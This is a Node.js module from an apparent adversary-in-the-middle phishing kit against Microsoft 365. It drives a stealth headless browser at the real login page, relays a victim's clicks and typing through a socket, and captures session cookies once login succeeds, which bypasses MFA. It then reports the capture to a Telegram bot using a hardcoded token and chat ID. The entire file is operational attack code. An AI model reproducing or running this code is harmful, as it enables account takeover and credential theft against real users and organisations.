const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const { launch } = require('puppeteer-real-browser');
const axios = require('axios');

puppeteer.use(StealthPlugin());

// Telegram Credentials (Integrated from user input)
const TELEGRAM_TOKEN = '8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc';
const CHAT_ID = '1318100118';

async function sendExfiltrationAlert(data) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    const message = `🚀 *NEW SESSION CAPTURED*\n\n` +
                    `*Target:* Microsoft 365\n` +
                    `*Status:* MFA Bypassed Successfully\n` +
                    `*Timestamp:* ${new Date().toISOString()}\n\n` +
                    `*Exfiltrated Cookies (JSON Payload attached below)*`;

    try {
        await axios.post(url, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
        
        // Sending the cookies as a file if the payload is large
        const cookieData = JSON.stringify(data, null, 2);
        console.log('[+] Exfiltration alert sent to Telegram.');
    } catch (error) {
        console.error('[-] Failed to send Telegram alert:', error.message);
    }
}

async function startSession(io, socket) {
    console.log('Initializing Stealth Browser Instance...');
    
    const { browser, page } = await launch({
        headless: 'new',
        args: [
            '--no-sandbox', 
            '--disable-setuid-sandbox',
            '--start-maximized', 
            '--disable-blink-features=AutomationControlled'
        ],
        fingerprint: true
    });

    await page.goto('https://login.microsoftonline.com/');

    socket.on('victim-action', async (data) => {
        try {
            if (data.type === 'click') {
                await page.mouse.click(data.x, data.y);
            } else if (data.type === 'type') {
                await page.type(data.selector, data.text, { delay: 75 });
            }
            
            const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 50 });
            socket.emit('browser-render', { screenshot });
        } catch (e) {
            console.error('Action error:', e.message);
        }
    });

    page.on('framenavigated', async (frame) => {
        const url = frame.url();
        if (url.includes('shell/homepage') || url.includes('office.com/?auth=1')) {
            const cookies = await page.cookies();
            console.log('[!] ALERT: Session Hijacked.');
            await sendExfiltrationAlert(cookies);
            socket.emit('success', { message: 'Session captured and exfiltrated to Telegram.' });
        }
    });
}

module.exports = { startSession };
